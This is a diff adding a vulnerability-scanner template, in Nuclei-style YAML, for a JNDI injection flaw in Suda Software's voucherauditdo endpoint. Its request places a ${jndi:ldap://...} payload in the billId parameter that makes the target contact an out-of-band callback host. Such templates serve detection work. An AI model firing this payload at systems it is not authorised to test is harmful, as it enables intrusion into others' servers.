@@ -1,0 +1,25 @@
+id: poc-yaml-suda-software-voucherauditdo-jnidi
+info:
+  name: Suda Software voucherauditdo JNDI Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,ldap-injection
+
+variables:
+  dns_log: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /account/voucher/voucherauditdo!toEdit.action?billId=${jndi:ldap://{{dns_log}}} HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "ldap"
